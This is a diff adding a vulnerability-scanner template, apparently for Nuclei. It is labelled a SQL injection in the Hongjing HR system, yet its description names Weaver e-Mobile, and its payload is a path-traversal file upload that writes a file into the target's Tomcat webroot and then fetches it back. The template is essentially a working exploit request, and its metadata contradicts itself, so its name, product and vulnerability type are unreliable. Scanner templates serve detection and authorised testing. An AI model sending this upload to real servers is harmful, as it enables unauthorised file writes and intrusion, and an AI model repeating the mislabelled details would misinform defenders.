@@ -1,0 +1,50 @@
+id: CNVD-2023-08743
+
+info:
+  name: Hongjing Human Resource Management System - SQL Injection
+  author: SleepingBag945
+  severity: critical
+  description: 泛微e-mobile,由高端OA泛微专业研发,是业内领先的移动OA系统,提供移动审批,移动考勤,移动报表,企业微信等丰富办公应用,支持多种平台运行,灵活易用安全性高
+  reference:
+    - https://www.henry4e36.top/index.php/archives/162.html
+    - https://blog.csdn.net/qq_41904294/article/details/130944159
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app.name="泛微 e-Mobile 移动管理平台",icon_hash="2062026853"
+  tags: cnvd,cnvd2023,hongjing,hcm
+
+http:
+  - raw:
+      - |
+        POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Content-Length: 210
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK
+
+        ------WebKitFormBoundarymVk33liI64J7GQaK
+        Content-Disposition: form-data; name="file";filename="../../../../appsvr/tomcat/webapps/ROOT/mikes.txt"
+
+        20231101
+        ------WebKitFormBoundarymVk33liI64J7GQaK--
+
+  - raw:
+      - |
+        GET /mikes.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      # - type: dsl
+      #   dsl:
+      #     - 'status_code == 200'
+      #     - 'contains_all(body,"data")'
+      #   condition: and
+      - type: word
+        words:
+          - "20231101"
